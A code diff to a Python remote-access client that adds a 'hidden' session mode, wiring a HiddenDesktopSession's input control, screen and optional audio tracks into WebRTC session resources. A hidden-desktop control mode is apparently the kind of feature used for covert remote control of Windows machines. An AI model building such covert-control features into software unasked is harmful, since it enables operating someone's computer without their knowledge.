@@ -13,6 +13,7 @@ from remote_client.control.input_controller import InputController, NullInputCon
 from remote_client.media.audio import AudioTrack
 from remote_client.media.screen import ScreenTrack
 from remote_client.webrtc.client import SessionResources
+from remote_client.windows.hidden_desktop import HiddenDesktopSession
 
 logger = logging.getLogger(__name__)
 
@@ -93,6 +94,32 @@ def build_session_resources(mode: str | None) -> SessionResources:
             set_stream_profile=_set_stream_profile,
             set_cursor_visibility=cursor_controller.set_visible,
         )
+    if normalized == "hidden":
+        try:
+            hidden_session = HiddenDesktopSession()
+        except Exception as exc:
+            logger.warning("Hidden desktop session unavailable: %s", exc)
+        else:
+            controller = hidden_session.input_controller
+            control_handler = _build_control_handler(controller)
+            media_tracks: list[Any] = [hidden_session.screen_track]
+            if _audio_enabled():
+                media_tracks.append(AudioTrack())
+
+            def _set_stream_profile(
+                profile: str | None,
+                width: int | None,
+                height: int | None,
+                fps: int | None,
+            ) -> None:
+                hidden_session.screen_track.set_profile(profile, width, height, fps)
+
+            return SessionResources(
+                control_handler,
+                media_tracks,
+                close=hidden_session.close,
+                set_stream_profile=_set_stream_profile,
+            )
 
     controller = InputController()
     screen_track = ScreenTrack(draw_cursor=False)
